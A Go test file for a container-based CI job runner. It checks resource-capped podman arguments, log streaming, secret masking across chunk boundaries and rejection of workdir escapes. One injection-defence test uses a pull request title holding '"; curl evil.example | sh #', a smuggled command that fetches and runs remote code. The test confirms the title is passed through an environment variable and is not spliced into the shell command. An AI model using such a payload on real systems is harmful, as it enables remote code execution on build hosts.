// SPDX-License-Identifier: AGPL-3.0-or-later

package engine

import (
	"context"
	"errors"
	"io"
	"reflect"
	"testing"
	"time"
)

type recordingRunner struct {
	name string
	args []string
	err  error
}

func (r *recordingRunner) Run(_ context.Context, name string, args []string, _, _ io.Writer) error {
	r.name = name
	r.args = append([]string{}, args...)
	return r.err
}

type loggingRunner struct{}

func (loggingRunner) Run(_ context.Context, _ string, _ []string, stdout, stderr io.Writer) error {
	_, _ = stdout.Write([]byte("hello "))
	_, _ = stderr.Write([]byte("world\n"))
	return nil
}

type secretLoggingRunner struct{}

func (secretLoggingRunner) Run(_ context.Context, _ string, _ []string, stdout, _ io.Writer) error {
	_, _ = stdout.Write([]byte("hun"))
	_, _ = stdout.Write([]byte("ter2\n"))
	return nil
}

func TestDockerExecute_BuildsResourceCappedRunCommand(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		Binary:       "podman",
		DefaultImage: "runner-image",
		Network:      "none",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	out, err := d.Execute(t.Context(), Job{
		ID:           1,
		RunID:        2,
		WorkspaceDir: t.TempDir(),
		Env:          map[string]string{"A": "job"},
		Steps: []Step{{
			Index:            0,
			Name:             "test",
			Run:              "echo hi",
			WorkingDirectory: "subdir",
			Env:              map[string]string{"B": "step"},
		}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
	want := []string{
		"run", "--rm", "--network=none", "--memory=2g", "--cpus=2", "--workdir=/workspace/subdir",
		"-v", rec.args[7],
		"-e", "A=job", "-e", "B=step",
		"runner-image", "bash", "-c", "echo hi",
	}
	if rec.name != "podman" {
		t.Fatalf("name: %s", rec.name)
	}
	if !reflect.DeepEqual(rec.args, want) {
		t.Fatalf("args:\ngot  %#v\nwant %#v", rec.args, want)
	}
}

func TestDockerExecute_RendersTaintedExpressionsThroughInputEnv(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	malicious := `"; curl evil.example | sh #`
	if _, err := d.Execute(t.Context(), Job{
		ID:           1,
		RunID:        2,
		HeadSHA:      "abc",
		HeadRef:      "refs/heads/trunk",
		EventPayload: map[string]any{"pull_request": map[string]any{"title": malicious}},
		WorkspaceDir: t.TempDir(),
		Steps: []Step{{
			Run: `echo "${{ shithub.event.pull_request.title }}"`,
		}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if got := rec.args[len(rec.args)-1]; got != `echo "${SHITHUB_INPUT_0}"` {
		t.Fatalf("rendered command: %q", got)
	}
	if !containsArg(rec.args, "SHITHUB_INPUT_0="+malicious) {
		t.Fatalf("input binding missing from args: %#v", rec.args)
	}
}

func TestDockerExecute_StreamsStepLogs(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 4,
		Runner:        loggingRunner{},
	})
	logs, err := d.StreamLogs(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamLogs: %v", err)
	}
	out, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{ID: 123, Run: "echo hi"}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if len(out.StepOutcomes) != 1 || out.StepOutcomes[0].StepID != 123 {
		t.Fatalf("StepOutcomes: %#v", out.StepOutcomes)
	}
	var got []LogChunk
	for chunk := range logs {
		got = append(got, chunk)
	}
	if len(got) == 0 {
		t.Fatal("no log chunks streamed")
	}
	if got[0].JobID != 99 || got[0].StepID != 123 || got[0].Seq != 0 {
		t.Fatalf("first chunk: %#v", got[0])
	}
}

func TestDockerExecute_ScrubsStepLogsAcrossChunkBoundary(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:  "runner-image",
		Network:       "bridge",
		Memory:        "2g",
		CPUs:          "2",
		LogChunkBytes: 3,
		Runner:        secretLoggingRunner{},
	})
	logs, err := d.StreamLogs(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamLogs: %v", err)
	}
	if _, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		MaskValues:   []string{"hunter2"},
		Steps:        []Step{{ID: 123, Run: "echo secret"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	var got string
	for chunk := range logs {
		got += string(chunk.Chunk)
	}
	if got != "***\n" {
		t.Fatalf("logs: %q", got)
	}
}

func TestDockerExecute_StreamsOrderedEvents(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage:     "runner-image",
		Network:          "bridge",
		Memory:           "2g",
		CPUs:             "2",
		LogFlushInterval: time.Hour,
		Runner:           loggingRunner{},
	})
	events, err := d.StreamEvents(t.Context(), 99)
	if err != nil {
		t.Fatalf("StreamEvents: %v", err)
	}
	if _, err := d.Execute(t.Context(), Job{
		ID:           99,
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{ID: 123, Run: "echo hi"}},
	}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	var got []Event
	for event := range events {
		got = append(got, event)
	}
	if len(got) != 2 {
		t.Fatalf("events: %#v", got)
	}
	if got[0].Log == nil || string(got[0].Log.Chunk) != "hello world\n" {
		t.Fatalf("first event: %#v", got[0])
	}
	if got[1].Step == nil || got[1].Step.StepID != 123 || got[1].Step.Conclusion != ConclusionSuccess {
		t.Fatalf("second event: %#v", got[1])
	}
}

func TestDockerExecute_FailureMapsToFailureConclusion(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       &recordingRunner{err: errors.New("exit 1")},
	})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "exit 1"}},
	})
	if err == nil {
		t.Fatal("Execute returned nil error")
	}
	if out.Conclusion != ConclusionFailure {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

func TestDockerExecute_ContinueOnErrorContinues(t *testing.T) {
	t.Parallel()
	rec := &recordingRunner{err: errors.New("exit 1")}
	d := NewDocker(DockerConfig{
		DefaultImage: "runner-image",
		Network:      "bridge",
		Memory:       "2g",
		CPUs:         "2",
		Runner:       rec,
	})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Run: "exit 1", ContinueOnError: true}},
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Conclusion != ConclusionSuccess {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

func TestDockerExecute_RejectsUnsupportedUses(t *testing.T) {
	t.Parallel()
	d := NewDocker(DockerConfig{DefaultImage: "runner-image", Network: "bridge", Memory: "2g", CPUs: "2", Runner: &recordingRunner{}})
	out, err := d.Execute(t.Context(), Job{
		WorkspaceDir: t.TempDir(),
		Steps:        []Step{{Uses: "actions/checkout@v4"}},
	})
	if !errors.Is(err, ErrUnsupportedUses) {
		t.Fatalf("error: %v", err)
	}
	if out.Conclusion != ConclusionFailure {
		t.Fatalf("Conclusion: %q", out.Conclusion)
	}
}

func TestContainerWorkdirRejectsEscapes(t *testing.T) {
	t.Parallel()
	for _, wd := range []string{"../x", "/tmp"} {
		if _, err := containerWorkdir(wd); err == nil {
			t.Fatalf("containerWorkdir(%q) returned nil error", wd)
		}
	}
}

func containsArg(args []string, want string) bool {
	for _, arg := range args {
		if arg == want {
			return true
		}
	}
	return false
}
